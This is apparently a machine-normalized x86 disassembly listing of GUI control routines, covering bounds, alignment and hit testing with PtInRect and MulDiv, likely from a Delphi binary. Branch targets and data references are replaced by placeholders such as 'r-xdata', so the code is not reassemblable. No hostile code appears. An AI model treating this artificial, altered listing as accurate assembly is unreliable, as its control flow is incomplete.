cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_456c34
sub_4575e2
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_455e94
mov cl 0x1
sub_457624
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_455bec
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_455bec
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_457654
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_457678
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406c9c
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_4033e8
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_456c00
mov [ ebx + 0xc ] eax
sub_45771c
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_455b40
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_455b40
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_4577b0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_403134
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_4551e0
mov edx [ esp ]
mov eax esi
call sub_4551bc
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_455468
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_4554ac
sub_457834
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_417744
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_455564
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_417794
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_45540c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4578c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_4577b0
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_45c380
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_457834
pop ecx
jmp r-xdata
sub_457920
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_457a0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457a15
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_455a7c
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_455a4c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_455a4c
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404388
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403fd0
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_45596c
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_457a1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_4033e8
sub_457a48
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_457a68
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_457a88
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_457aa8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_457ac8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_457ae8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_457b08
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_42173c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_4550a0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4033e8
sub_457b40
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_457bdc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4194bc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_46227c
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_4623b4
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_455a4c
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_462114
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_4624d4
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457be3
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_457bec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_457c28
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_457bec
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_457cd8
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_403378
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_457d0c
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_457d2c
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_4033e8
test al al
je r-xdata
mov eax edi
call sub_457d6c
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_457d98
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_457dc4
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406c9c
mov eax esp
call sub_4177bc
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_455590
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_4033e8
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_4033e8
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_4555bc
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_4177bc
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_417744
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_455564
sub_457eec
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_457f2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45802e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
add [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
add [ ebx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
test eax eax
jne r-xdata
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458035
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fa0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
cmp esi eax
je r-xdata
mov edx [ eax + 0x40 ]
add [ ebx ] edx
mov edx [ eax + 0x44 ]
add [ ebx + 0x4 ] edx
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_458040
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_454790
mov eax esi
mov edx [ r-xdata ]
call sub_40339c
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_458074
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_45816c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_454b4c
push ebx
push sub_459b04
call sub_42237c
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424dcc
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_424f74
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403550
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4738dc
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403fd0
lea eax [ ebx + 0x188 ]
call sub_403f7c
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458173
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
sub_458173
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_458198
push ebx
push esi
push edi
call sub_4035b8
mov ebx edx
mov edi eax
mov eax edi
call sub_42158c
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4058a0
mov eax [ edi + 0x178 ]
call sub_4031ec
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_4536f8
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_458e38
mov eax edi
call sub_459078
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_4031ec
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_45903c
mov esi eax
mov edx esi
mov eax edi
call sub_458ea4
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_459078
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_454c24
test bl bl
jle r-xdata
call sub_422414
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035a0
sub_458268
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_45832c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418fbc
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_45c540
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418dc4
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_418f10
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418dc4
test eax eax
je r-xdata
sub_45833c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_458be0
xor eax eax
push ebp
push sub_45837c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_454e88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458383
mov eax [ ebp - 0x4 ]
call sub_458be8
retn
sub_458383
mov eax [ ebp - 0x4 ]
call sub_458268
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_459a3c
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_456c00
sub_4583b8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_4583d3 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_458444
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45c684
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_417744
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_4587c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4587cc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_4586da ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
